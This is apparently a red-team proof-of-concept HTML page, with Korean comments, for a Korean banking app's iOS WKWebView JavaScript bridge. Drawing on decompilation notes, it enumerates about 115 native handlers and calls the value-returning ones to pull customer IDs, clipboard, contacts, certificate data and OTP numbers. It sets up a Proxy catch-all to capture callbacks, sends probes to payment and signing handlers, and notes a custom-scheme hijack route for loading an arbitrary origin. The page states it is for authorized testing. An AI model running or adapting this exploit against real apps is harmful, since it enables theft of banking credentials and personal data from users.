<!doctype html>
<html lang="ko">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>REDTEAM PoC — Bridge Reachability (대상 앱 테스트 전용)</title>
<style>
  body{font-family:-apple-system,system-ui,sans-serif;margin:0;padding:16px;background:#0b0b0d;color:#e6e6e6}
  h1{font-size:17px;color:#ff5c5c}
  .warn{background:#2a1a1a;border:1px solid #633;padding:10px;border-radius:8px;font-size:12px;margin:8px 0}
  .ok{color:#4ade80}.bad{color:#ff6b6b}.muted{color:#888}
  #log{white-space:pre-wrap;font:11px ui-monospace,Menlo,monospace;background:#141418;border-radius:8px;padding:12px;margin-top:12px}
</style>
</head>
<body>
<h1>⚠️ REDTEAM PoC — Bridge Reachability</h1>
<div class="warn">
  승인된 <b>대상 앱 테스트 전용</b>. READ 메서드로 <b>값 반환 가능 여부</b>만 확인한다.
  결제·서명 메서드는 <b>존재 열거만</b> 하고 실행하지 않는다. 외부 배포·실사용자 대상 사용 금지.
</div>
<div id="log"></div>

<script>
const L=(s,c)=>{const d=document.getElementById('log');d.innerHTML+=(c?`<span class="${c}">${s}</span>`:s)+"\n";};
L("오리진: "+location.href,"muted");L("—".repeat(46));

/* ────────────────────────────────────────────────────────────────────────
 * Ghidra 디컴파일로 확정 (SmartBank_Product, arm64)
 *  - 등록: FeatureChannel.ChannelViewController viewDidLoad → FUN_10032753c
 *          WKUserContentController.addScriptMessageHandler(self, name:) 를 115회(0x73) 루프 등록
 *          enum 테이블 DAT_1033dd330(115개) → rawValue 문자열이 핸들러명
 *  - 수신: ChannelViewController.userContentController:didReceiveScriptMessage:  (0x100333188)
 *          message.name = 커맨드(아래 call*),  message.body = JSON 문자열(파라미터)
 *          → ReactorKit Reactor Action 으로 래핑(PassthroughSubject.send) → UseCase 디스패치
 *  - JS 호출형:  window.webkit.messageHandlers.<call*>.postMessage('<JSON파라미터>')
 *  - enum rawValue 블록: __cstring 0x102525f12 ~ 0x102526962 (ChannelWebBridgeCommand)
 * ──────────────────────────────────────────────────────────────────────── */

// [A] ChannelViewController 브릿지 — 실제 등록되는 핸들러 전체(케이싱 정확, 디컴파일 추출)
const ALL=[
 "callSTT","callArsPhone","callShowLoading","callLoadingViewShow","callLoadingViewHide",
 "callWebViewOpen","callWebViewClose","callWebViewLoad","callExternalWebView","callPhotoGallery",
 "callIDCardOcr","callQRScan","callLogin","callUserLogout","callGetSetting","callSetSetting",
 "callKbankGetSetting","callKbankSetSetting","callExternalSetting","callGetPushSettings","callSetPushSettings",
 "callGetColorTheme","callSetColorTheme","callGetLanguage","callSetLanguage","callGetSteps",
 "callCreateUuid","callCreateAutoLoginUuid","callSaveAutoLoginUuid","callExistAutoLoginUuid","callDeleteAutoLoginUuid",
 "callGetClipBoard","callGetClipBoardId","callIsDeviceLock","callIsVoiceOver","callIsCalling",
 "callDeviceHaptic","callKbankHaptic","callStatusBarStyle","callSetBrightness","callCheckScheme",
 "callStartApp","callMobileIDApp","callOpenBrowser","callSendSms","callSendMore","callKbankShare",
 "callShareSns","callGetContact","callContact","callContactMulti","callTransferWidget",
 "callSaveImage","callSaveFile","callNormalSaveFile","callPageFinished","callCacheClear",
 "callShowAppStoreRatingPopup","callShowMiniGame","callShowRewardVideo","callFlowControlState",
 "callKeypad","callCloseKeypad","callFaceAuth","callAppIronAuth","callNativeRestAPI",
 "callScrapingBig","callScrapingMulti","callRequestFdsCollectionServer","callEzl",
 // 인증서(공동/금융인증)
 "callCertList","callCertConfirmArray","callCertDelete","callCertUbikey","callCertUbikeySave","callCertPdfSign",
 "callCommonCertInfo","callCommonCertIssue","callCommonCertImport","callCommonCertExport",
 "callCommonCertUpdate","callCommonCertPasswordChange",
 "callSimpleCertList","callSimpleCertIssue","callSimpleCertCheckPin","callSimpleCertDelete","callSimpleCertPasswordChange",
 // MPKI(모바일 사설인증) / 서명
 "callMPKIBioCheck","callMPKIBioRegComplete","callMPKIIssue","callMPKIIssueSave","callMPKIDiscard",
 "callMPKIgetAllInfo","callMPKIgetBioSignature","callMPKISign","callMPKISignWithAttr",
 // MOTP(일회용비번)
 "callMotpExist","callMotpNumber","callMotpCheckPw","callMotpSavePassword","callMotpDelete",
 "callMotpKeyChange","callMotpKeyChangePassword",
 // OTAC
 "callOtacRegister","callOtacDeregister","callOtacGetRegistrationMessage","callOtacGetVerifyMessage",
 // 결제
 "callNonLoginPay","callZeroPayTranReq","callZeroPayRsltReq","callPayCodeCreate"];

// [B] FeatureExternal.ExternalWebView 브릿지(별도 핸들러 세트 — 케이싱/명칭 상이, 0x10219cxx~0x10219dxx)
const EXTERNAL=[
 "callLoadingViewShow","callLoadingViewHide","callWebViewOpen","callWebViewClose","callWebViewLoad",
 "callExternalWebView","callPhotoGallery","callIDCardOcr","callQRScan","callDeviceHaptic",
 "callGetContact","callShareSNS","callMobileIDApp","callPageFinished","callNativeRestAPI",
 "callSetStatusBarFontColor","callShowAppStoreRatingPopup",
 "callMPKIBioCheck","callMPKIIssue","callMPKIIssueSave","callMPKIDiscard","callMPKIgetAllInfo",
 "callMPKIBioRegComplete","callMPKISign","callMPKISignWithAttr","callMPKIgetBioSignature",
 "callCommonCertInfo","callCommonCertUpdate","callCommonCertIssue","callCommonCertImport",
 "callCommonCertExport","callCommonCertPwdChange",
 "callRequestFDSCollectionServer",
 "callOTACRegister","callOTACDeregister","callOTACGetRegistrationMessage","callOTACGetVerificationMessage"];

// [C] 웹뷰 로드형 — ukbanksmartbankweb://channel?url= 연계 공격면(임의 origin 로드 → 브릿지 접근)
const WEBOPEN=["callWebViewOpen","callWebViewLoad","callExternalWebView","callOpenBrowser"];

// 값 반환(READ) — probe로 값(식별자/인증정보) 탈취 가능 여부 확인
const READ=[
 "callKbankGetSetting","callGetSetting","callGetClipBoard","callGetClipBoardId","callGetContact","callContact","callContactMulti",
 "callGetPushSettings","callGetSteps","callGetColorTheme","callGetLanguage","callCertList","callSimpleCertList",
 "callMPKIgetAllInfo","callMPKIgetBioSignature","callExistAutoLoginUuid","callMotpExist","callMotpNumber",
 "callIsCalling","callIsDeviceLock","callIsVoiceOver","callCreateUuid","callCommonCertInfo","callCommonCertExport",
 "callCertConfirmArray","callOtacGetRegistrationMessage","callOtacGetVerifyMessage","callArsPhone","callCheckScheme","callPageFinished","callFlowControlState"];

// 민감 ACTION — 열거만(실행 안 함): 인증/서명/결제/파일/설정변경
const ACTION=[
 "callLogin","callUserLogout","callNonLoginPay","callZeroPayTranReq","callZeroPayRsltReq","callPayCodeCreate",
 "callMPKISign","callMPKISignWithAttr","callMPKIIssue","callMPKIIssueSave","callMPKIDiscard","callMPKIBioCheck","callMPKIBioRegComplete",
 "callCertPdfSign","callCertUbikey","callCertUbikeySave","callCertDelete","callCommonCertIssue","callCommonCertImport",
 "callCommonCertUpdate","callCommonCertPasswordChange","callSimpleCertCheckPin","callSimpleCertDelete","callSimpleCertPasswordChange","callSimpleCertIssue",
 "callMotpKeyChange","callMotpKeyChangePassword","callMotpDelete","callMotpCheckPw","callMotpSavePassword",
 "callCreateAutoLoginUuid","callSaveAutoLoginUuid","callDeleteAutoLoginUuid","callOtacRegister","callOtacDeregister",
 "callAppIronAuth","callFaceAuth","callKeypad","callNativeRestAPI","callScrapingBig","callScrapingMulti",
 "callSaveFile","callNormalSaveFile","callSaveImage","callStartApp","callMobileIDApp","callSendSms",
 "callSetSetting","callKbankSetSetting","callSetPushSettings","callSetColorTheme","callSetLanguage","callExternalSetting",
 "callEzl","callSetBrightness","callCacheClear","callRequestFdsCollectionServer"];

// 디스패처 핸들러명 후보 (단일핸들러+method 디스패치형일 때)
const DISPATCHERS=["smartbank","kbank","Kbank","SmartBank","native","nativeBridge","KbankBridge",
  "JavaScriptService","kbankWebView","windowLoaded","iOS","consoleLog"];

// ── 응답 '값' 포착: 콜백명/포맷과 무관하게 네이티브가 돌려준 값 전체를 표시 ──
function fmt(a){try{return (a&&typeof a==="object")?JSON.stringify(a):String(a);}catch(e){return String(a);}}
const SENS=/custid|cust_id|member|userid|uuid|phone|mobile|ssn|jumin|birth|account|acct|balance|cert|token|signature|sign|clip|session|cookie|pin|passw|bio|otp|motp|mpki|card|regi|serial/i;
function showResp(name,args){
  const vals=args.map(fmt); const joined=vals.join(" | ");
  const sens=SENS.test(name+" "+joined);
  L(`[응답] ${name}(${args.length}개인자) = ${joined.slice(0,6000)}`+(sens?"   ⚠️ 민감값!":""),sens?"bad":"ok");
}
// (a) 흔한 고정 콜백명 다수 정의 → 그 이름으로 돌려주면 값 표시
["nativeCallback","bridgeCallback","onNativeResult","webkitCallback","kbankCallback","callback",
 "jsCallback","resultCallback","nativeBridgeCallback","onResult","responseHandler","__rt","callBackId",
 "nativeCallBack","webkit_callback","smartbankCallback"].forEach(n=>{try{window[n]=(...a)=>showResp(n,a);}catch(e){}});
// (b) catch-all: window의 '정의되지 않은 함수' 호출을 프로토타입 Proxy로 전부 가로챔
//     → 네이티브가 callBackId로 넘긴 '임의 함수명'으로 window.xxx(result) 호출해도 값 포착
try{
  const realProto=Object.getPrototypeOf(window)||Object.prototype;
  Object.setPrototypeOf(window, new Proxy(realProto,{
    get(t,p,r){
      if(typeof p!=="string") return Reflect.get(t,p,r);
      if(p in t) return Reflect.get(t,p,r);                 // 원래 프로토타입 속성은 유지
      if(/^__proto__$|^constructor$|^then$|^Symbol/.test(p)) return undefined;
      return (...a)=>showResp(p,a);                          // 미정의 접근 → 콜백으로 간주, 값 표시
    }
  }));
  L("catch-all 설치됨 — 임의 콜백명 응답도 값까지 표시","muted");
}catch(e){ L("catch-all 설치 실패(고정 콜백명으로만 포착): "+e,"muted"); }

const mh=(window.webkit&&window.webkit.messageHandlers)||{};
function send(h,payload){try{if(mh[h]){mh[h].postMessage(payload);return true;}}catch(e){}return false;}

// 1) 각 READ 메서드를 (a)개별 핸들러로 (b)디스패처+method 로 호출
L(`[READ] 값 반환 시도 (${READ.length}개):`,"muted");
// 디컴파일로 확정한 요청 규약(FeatureChannel 커맨드 모델 cstring):
//   callBackId        = 네이티브가 응답 시 호출할 JS 전역 함수명  (정확 키, 대문자 B)
//   callBackParam1..5 = 패스스루 컨텍스트(네이티브가 응답 인자로 되돌려줌) → 포맷 확인용 마커
//   호출형: window.<callBackId>( ...응답값/파라미터... )
function cbFields(cb){return {
  callBackId:cb,                                   // ← 정확 키
  callBackParam1:"P1",callBackParam2:"P2",callBackParam3:"P3",callBackParam4:"P4",callBackParam5:"P5",
  callback:cb,callbackId:cb                         // 혹시 모를 변형 대비(catch-all로도 포착됨)
};}
READ.forEach(m=>{
  let hit=false;
  const cb="rtcb_"+m.replace(/[^A-Za-z0-9]/g,"");
  try{window[cb]=(...a)=>showResp(cb,a);}catch(e){}  // callBackId로 지정한 전역 함수 실제 정의
  const body=Object.assign({param:"custid",key:"custid",data:{key:"custid"}},cbFields(cb));
  // (a) 메서드명 자체가 핸들러명인 경우 — body는 JSON 문자열
  hit|=send(m,JSON.stringify(body));
  hit|=send(m,"custid");
  // (b) 디스패처 핸들러에 method 필드로
  DISPATCHERS.forEach(d=>{hit|=send(d,JSON.stringify(Object.assign({method:m,data:{key:"custid"}},cbFields(cb))));});
  L(`  ${m}: ${hit?"전송됨 → 응답 오면 [응답]에 값+P1~P5 마커 표시":"핸들러 없음"}`,hit?"ok":"muted");
});

// 2) 노출된 핸들러 열거
L("—".repeat(46));
let names=[];try{names=Object.keys(mh);}catch(e){}
[...ALL,...EXTERNAL,...DISPATCHERS].forEach(n=>{if(mh[n])names.push(n);});
names=[...new Set(names)];
L(`노출된 브릿지 핸들러 (후보 ${[...new Set([...ALL,...EXTERNAL])].length}개 중 탐지): `+(names.length?names.join(", "):"(열거 불가)"),names.length?"bad":"muted");

// 3) 웹뷰 로드형 — 임의 origin 로드 연계(열거만)
L("—".repeat(46));
L("[WEBOPEN] 임의 URL 로드형(열거만): "+WEBOPEN.filter(h=>mh[h]).join(", ")+"  ※ ukbanksmartbankweb://channel?url= 연계면 브릿지 전체 노출","muted");

// 4) ACTION — 도달 확증 probe: 무효 파라미터만 보내 '핸들러가 디스패치되는지'를 응답으로 확인.
//    ※ 유효한 결제/서명 파라미터는 절대 안 보냄 → 실제 거래/서명 미발생.
//    ※ 반드시 '확실히 격리된 샌드박스'에서만 실행할 것.
L("—".repeat(46));
L(`[ACTION] 도달 확증 probe (${ACTION.length}개, 무효 파라미터 — 실제 실행 아님):`,"muted");
ACTION.forEach(m=>{
  const ack="__ack_"+m.replace(/[^A-Za-z0-9]/g,"");
  // 네이티브가 이 ack 콜백을 부르면 = 해당 메서드 핸들러가 실제로 디스패치됨 = 도달 확증 (+응답값 표시)
  try{window[ack]=(...a)=>L(`  ${m}: 도달 확증 ✅ (응답=${a.map(x=>{try{return typeof x==="object"?JSON.stringify(x):String(x)}catch(e){return String(x)}}).join(" | ").slice(0,300)})`,"bad");}catch(e){}
  const probe=JSON.stringify(Object.assign({__probe:"reachability-only"},cbFields(ack)));   // 유효 거래값 없음 → 정상 핸들러면 거부
  let sent=send(m,probe);
  DISPATCHERS.forEach(d=>{sent=send(d,JSON.stringify(Object.assign({method:m,data:{__probe:"reachability-only"}},cbFields(ack))))||sent;});
  L(`  ${m}: ${sent?"probe 전송 → 응답 오면 도달 확증":(names.length?"도달 가능성(추론)":"핸들러 없음")}`,
    sent?"muted":(names.length?"bad":"muted"));
});

L("—".repeat(46));
L("판정: [응답]에 custid/uuid/token/signature 뜨면 = 오리진검증 없음(#1 취약). 서버로그 히트 = 스킴 하이재킹 성립.","muted");
L(`커맨드 모델: message.name=핸들러명, message.body=JSON문자열 → Reactor → UseCase. 등록 115개(FUN_10032753c).`,"muted");
</script>
</body>
</html>
